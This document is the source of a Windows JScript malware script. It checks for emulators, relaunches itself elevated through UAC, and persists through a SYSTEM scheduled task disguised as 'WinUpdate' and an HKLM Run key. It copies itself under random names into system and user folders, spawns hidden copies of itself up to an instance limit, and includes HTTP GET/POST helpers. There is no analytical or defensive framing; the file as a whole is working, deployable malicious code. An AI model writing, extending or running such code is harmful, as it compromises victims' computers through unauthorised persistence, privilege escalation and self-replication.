function Base() {
    this.servicename = 'WinUpdate';
    this.fileprefix = '_mys';
    this.procIdentifier = WScript.Arguments.length > 0 ? WScript.Arguments(0) : 'DANGEROUSANDMOVING';
    this.procLimit = 5; // 5 is more than enough, trust me
    this.maxInstances = 25;
};

// Shortkeys
Base.prototype._wsh = function() {
    return WScript.CreateObject('WScript.Shell');
};

// Utils
Base.prototype._queryWMI = function(wmiQuery) {
    var objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2");
    return objWMIService.ExecQuery(wmiQuery, null, 48);
};

Base.prototype._debugWmiProps = function(colObj) {
    if (typeof colObj['Properties_'] === 'undefined') {
        return false;
    } else {
        var props = new Enumerator(colObj.properties_);
        for (;!props.atEnd(); props.moveNext()) {
            WScript.Echo(props.item().name + ': ' + props.item().value);
        }
    }
};

Base.prototype._getGUID = function() {
    var t = WScript.CreateObject('Scriptlet.TypeLib');
    return t.guid.substr(1, 36);
};

Base.prototype._getRandName = function() {
    var fso = WScript.CreateObject('Scripting.FileSystemObject');
    var res = '';
    for (var i = 0; i < 5; i++) {
        res += fso.getTempName().substr(3, 5);
    }

    return res.substr(5, 11).toLowerCase();
};

Base.prototype._getts = function() {
    var d = new Date();
    var p = function(_d) {
        return ('0' + _d).slice(-2);
    };

    return [
        d.getFullYear(),
        p(d.getMonth() + 1),
        p(d.getDate())
    ].join('-') + ' ' + [
        p(d.getHours()),
        p(d.getMinutes()),
        p(d.getSeconds())
    ].join(':');
};

Base.prototype._writeLog = function(line) {
    var fso = WScript.CreateObject('Scripting.FileSystemObject');
    var logdir = this._wsh().expandEnvironmentStrings('%appdata%\\LegitCorp');
    var logfile = 'LICENSE';
    var fullpath = logdir + '\\' + logfile;

    if (!fso.folderExists(logdir)) {
        fso.createFolder(logdir);
    }

    var l = !fso.fileExists(fullpath) ? fso.CreateTextFile(fullpath, true) : fso.OpenTextFile(fullpath, 8);
    l.writeLine('[' + this._getts() + '] ' + line);
    l.close();
};

// Anti-emulator check
Base.prototype.isWScript = function() {
    return typeof WScript !== 'undefined' && typeof window === 'undefined' && typeof document === 'undefined';
};

// Check if script is running elevated
Base.prototype.isElevated = function() {
    var isElevated = true;

    try {
        this._wsh().regRead('HKEY_USERS\\S-1-5-19\\Environment\\TEMP');
    } catch (e) {
        isElevated = false;
    }

    return isElevated;
};

// Relaunch own process with elevated privileges (requires UAC)
Base.prototype.relaunchAsElevated = function() {
    var uac = WScript.CreateObject('Shell.Application');
    var args = ['//Nologo', '//E:jscript', '//B', WScript.ScriptFullName].join(' ');
    uac.shellExecute('cscript.exe', args, '', 'runas', 1);
};

Base.prototype.setMaxNumInstances = function() {
    var keyLoc = 'HKLM\\Software\\LegitCorp\\Version';

    try {
        this._wsh().regRead(keyLoc);
    } catch (e) {
        this._wsh().regWrite(keyLoc, 0, 'REG_DWORD');
    }
};

Base.prototype.maxNumInstancesReached = function() {
    var keyLoc = 'HKLM\\Software\\LegitCorp\\Version';

    var regval = this._wsh().regRead(keyLoc);
    var belowLimit = regval < this.maxInstances;

    if (belowLimit) {
        this._writeLog('Reached ' + regval + '/' + this.maxInstances + ' instances');
    }

    return !belowLimit;
};

Base.prototype.updateNumInstances = function() {
    var keyLoc = 'HKLM\\Software\\LegitCorp\\Version';
    var val = this._wsh().regRead(keyLoc);
    this._wsh().regWrite(keyLoc, val += 1, 'REG_DWORD');

    this._writeLog('Updated numinstances to ' + this._wsh().regRead(keyLoc));
};

// Register as scheduled task to run at system startup
// Grants persistency
Base.prototype.scheduleTask = function() {
    var wsh = this._wsh();
    wsh.Run('schtasks /create /sc onstart /ru SYSTEM /rl highest /tn ' + this.servicename + ' /tr "cscript.exe //NoLogo //E:jscript //B ' + WScript.ScriptFullName + '"');
};

// Check if task is scheduled
Base.prototype.checkScheduledTasks = function() {
    var exc = this._wsh().Exec('schtasks /query /tn ' + this.servicename);
    while (exc.status == 0) {
        WScript.Sleep(100);
    }

    // If exit code is 0, task exists
    return exc.exitCode === 0;
};

// Check persistency through Registry
Base.prototype.regRunKeyWritten = function() {
    var keyLoc = 'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run';
    var objExec = this._wsh().Exec('reg query ' + keyLoc);
    var strKeys = objExec.StdOut.ReadAll();
    var a = strKeys.split('\n');

    for (var i = 0; i < a.length; ++i) {
        if (a[i].match(WScript.ScriptName)) {
            return true;
        }
    }

    return false;
}

// Gain persistency through Registry
Base.prototype.writeRegRunKey = function() {
    var keyLoc = 'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\' + this._getGUID();
    var keyPath = 'cscript.exe //nologo //e:jscript "' + WScript.ScriptFullName + '"';
    this._wsh().regWrite(keyLoc, keyPath, 'REG_SZ');
};

// Get own process ID by getting parent of child
Base.prototype.getOwnPID = function() {
    // Create child process
    var childTitle = +new Date + (Math.random() * 0xffff).toString(16);
    var childCmd = 'cmd.exe /k title ' + childTitle;

    this._wsh().Run(childCmd, 7, false);

    // Query for child process
    var getChildQuery = 'SELECT * FROM Win32_Process WHERE CommandLine LIKE "%cmd.exe%' + childTitle + '"';
    var colItems = new Enumerator(this._queryWMI(getChildQuery));

    var ownPID = 0;
    for (;!colItems.atEnd();colItems.moveNext()) {
        var procItem = colItems.item();

        ownPID = procItem.parentProcessId;
        procItem.terminate();
    }

    return ownPID;
};

// Get any process by PID
Base.prototype.getProcessByPID = function(pid) {
    var getChildQuery = 'SELECT * FROM Win32_Process WHERE ProcessId = ' + pid;
    var colItems = new Enumerator(this._queryWMI(getChildQuery));

    var ownPID = 0;
    for (;!colItems.atEnd();colItems.moveNext()) {
        var procItem = colItems.item();

        /*
        var ownerProps = procItem.ExecMethod_('GetOwner');
        var ownerSid = procItem.ExecMethod_('GetOwnerSid');

        procItem.Domain = ownerProps.Domain;
        procItem.User = ownerProps.User;
        procItem.Sid = ownerSid.Sid;
        */

        this._debugWmiProps(procItem);
    }
};

// Copies itself to a random location
Base.prototype.copySelf = function() {
    var fso = WScript.CreateObject('Scripting.FileSystemObject');
    var folders = ['%windir%\\system32','%homepath%','%appdata%','%programdata%','%programfiles%','%programfiles(x86)%','%temp%','%localappdata%','%public%','%commonprogramfiles%','%commonprogramfiles(x86)%'];
    var randdest = folders[Math.floor(Math.random() * folders.length)];
    var dirname = this._getRandName();
    var filename = this.fileprefix + this._getRandName() + '.tmp';

    var destdir = [this._wsh().expandEnvironmentStrings(randdest), dirname].join('\\');
    var destfile = destdir + '\\' + filename;

    var f = fso.createFolder(destdir);

    fso.copyFile(WScript.ScriptFullName, destfile);

    this._writeLog('Copied self to ' + destfile);

    this.spawnChild(destfile, [], 0);
};

// Spawns script as child process
Base.prototype.spawnChild = function(scriptPath, scriptArgs, showWindow) {
    scriptPath = scriptPath || WScript.ScriptFullName;
    scriptArgs = scriptArgs instanceof Array ? scriptArgs : [scriptArgs];
    showWindow = showWindow ? 1 : 0; // 0 is hidden, 1 is shown

    var uac = WScript.CreateObject('Shell.Application');
    var args = [
        '//Nologo', // Prevent logo display: No banner will be shown at execution time
        '//E:jscript', // Use engine for executing script
        // '//B', // Batch mode: Suppresses script errors and prompts from displaying
        '"' + scriptPath + '"', // Scriptname
    ].concat(scriptArgs).join(' ');

    uac.shellExecute(WScript.FullName, args, '', 'open', showWindow);
};

// Creates n instances of the current process
Base.prototype.spawnSelf = function() {
    // Check how many processes are running
    // If below this.procLimit, spawn process
    var getChildQuery = 'SELECT * FROM Win32_Process WHERE CommandLine LIKE "%' + this.procIdentifier + '%"';
    var colItems = new Enumerator(this._queryWMI(getChildQuery));

    var procCount = 0;
    for (;!colItems.atEnd();colItems.moveNext()) procCount++;

    if (procCount < this.procLimit) {
        this.spawnChild(WScript.ScriptFullName, [this.procIdentifier], true);
    }
};

// HTTP GET request
Base.prototype.httpGet = function(url) {
    var xhr = new ActiveXObject('MSXML2.XMLHTTP');
    xhr.open('GET', url, false);
    xhr.send();

    return xhr.responseText;
};

// HTTP POST request
Base.prototype.httpPost = function(url, data) {
    var xhr = new ActiveXObject('MSXML2.XMLHTTP');
    xhr.open('POST', url, false);
    xhr.setRequestHeader('Content-Type', 'text/plain');
    xhr.send(data);

    return xhr.responseText;
};

//////
var b = new Base();

// Check if we're in WScript and not an emulator
if (!b.isWScript()) {
    WScript.Quit();
}

// Check if we're running elevated
if (!b.isElevated()) {
    b.relaunchAsElevated();
    WScript.Quit();
}

// Check if the task is scheduled
if (!b.checkScheduledTasks()) {
    b.scheduleTask();
}

// Check if the RUN key was written
if (!b.regRunKeyWritten()) {
    b.writeRegRunKey();
    b.setMaxNumInstances();
}

// Check if the max num of instances was reached
if (!b.maxNumInstancesReached()) {
    b.updateNumInstances();
    b.copySelf();
}
